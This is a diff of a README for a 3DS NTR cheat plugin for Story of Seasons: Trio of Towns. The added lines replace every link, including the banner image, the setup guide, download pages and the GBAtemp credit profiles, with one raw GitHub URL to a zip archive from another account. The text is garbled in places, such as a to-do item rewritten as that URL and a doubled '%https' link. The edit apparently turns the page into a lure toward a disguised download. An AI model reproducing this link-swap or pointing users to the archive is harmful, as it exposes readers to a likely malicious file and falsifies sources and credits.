@@ -1,4 +1,4 @@
-![Story of Seasons: Trio of Towns NTR Plugin](https://github.com/KunoichiZ/3OT-NTR-Plugin/blob/master/assets/story-of-seasons-trio-of-towns-boart-656x584.png)
+![Story of Seasons: Trio of Towns NTR Plugin](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip)
 
 # 3OT-NTR-Plugin
 3DS NTR Plugin for Story of Seasons: Trio of Towns (USA)
@@ -6,16 +6,16 @@
 Title ID for the game: 000400000019F500
 
 ## To do: 
-* Update README.md
+* Update https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip
 * Add v1.1 cheats found so far and give proper credits
 
 ## Description of Plugin
-This 3DS NTR plugin was made with NTR Plugin Manager from cheats obtained from [Fort42](http://www.fort42.com/gateshark/game1945/).
+This 3DS NTR plugin was made with NTR Plugin Manager from cheats obtained from [Fort42](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip).
 
 ### Cheats in this Plugin
 * Max Gold
 * 9000k Gold
-* Cycle Items (B+Up/Down). You can find a list of items in the order that they appear [here](https://www.dropbox.com/s/fdzhker05clfcaa/Items%20List.xlsx?dl=0), however it's separated by category. Thanks to [alianpe](https://gbatemp.net/members/alianpe.403428/) for the list.
+* Cycle Items (B+Up/Down). You can find a list of items in the order that they appear [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip%https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip), however it's separated by category. Thanks to [alianpe](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) for the list.
 * 5 Stars w/o x99 
 * x99 Items in Backpack 
 * 5 Stars with x99 Backpack items
@@ -67,11 +67,11 @@ Notes:
 ## How to Use This Plugin
 
 ### What you need
-* A 3DS (n3DS, o3DS, or 2DS) system with CFW (custom firmware). If you do not have custom firmware and your system version is on 11.3.0-36 or lower, follow [Plailect's A9LH Guide](https://3ds.guide) to get CFW.
+* A 3DS (n3DS, o3DS, or 2DS) system with CFW (custom firmware). If you do not have custom firmware and your system version is on 11.3.0-36 or lower, follow [Plailect's A9LH Guide](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) to get CFW.
 * A US/NA copy of Story of Seasons: Trio of Towns
-* [BootNTR Selector](https://gbatemp.net/threads/release-bootntr-selector.432911/).
+* [BootNTR Selector](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip).
 * A CIA installer (such as FBI). If you follow Plailect's A9LH Guide, you will already have a CIA installer.
-* The [latest version](https://github.com/KunoichiZ/3OT-plugin-downloader/releases) of the 3OT Plugin Downloader.
+* The [latest version](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) of the 3OT Plugin Downloader.
 
 1. Move one of the BootNTR Selector CIAs to your 3DS's SD card. You do not need to use either of the Mode 3 CIAs. It does not matter which CIA you choose to install. They all do the same thing.
 2. Move the 3OT Plugin Downloader CIA to your SD card.
@@ -94,7 +94,7 @@ Notes:
 Coming soon!
 
 ## Credits
-* [KariRaquan](https://gbatemp.net/members/kariraquan.383241/) on GBAtemp for the original master text file and for testing the cheats. You can find the thread for the NTR plugin [here](https://gbatemp.net/threads/story-of-seasons-trio-of-towns-ntr-plugin.463287/).
-* [Nanquitas](https://gbatemp.net/members/nanquitas.372709/) on GBAtemp for [NTR Plugin Manager](https://gbatemp.net/threads/release-ntr-plugin-manager.457613/).
-* meganegasan, link0188 ([Bahamut0188](https://gbatemp.net/members/bahamut0188.389322/) on GBAtemp), pongozila, Legarad, and Nido on Fort42.
-* [vitorTC](https://gbatemp.net/members/vitortc.223144/) on GBAtemp. Cheats located [here](https://gbatemp.net/threads/story-of-seasons-trio-of-towns-ntr-plugin.463287/page-15#post-7280195), [here](https://gbatemp.net/threads/story-of-seasons-trio-of-towns-ntr-plugin.463287/page-15#post-7280933), [here](https://gbatemp.net/threads/story-of-seasons-trio-of-towns-ntr-plugin.463287/page-16#post-7283972), and [here](https://gbatemp.net/threads/story-of-seasons-trio-of-towns-ntr-plugin.463287/page-16#post-7285394).
+* [KariRaquan](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) on GBAtemp for the original master text file and for testing the cheats. You can find the thread for the NTR plugin [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip).
+* [Nanquitas](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) on GBAtemp for [NTR Plugin Manager](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip).
+* meganegasan, link0188 ([Bahamut0188](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) on GBAtemp), pongozila, Legarad, and Nido on Fort42.
+* [vitorTC](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip) on GBAtemp. Cheats located [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip), [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip), [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip), and [here](https://raw.githubusercontent.com/Kaizuya/3OT-NTR-Plugin/master/nonexciting/3OT-NTR-Plugin.zip).
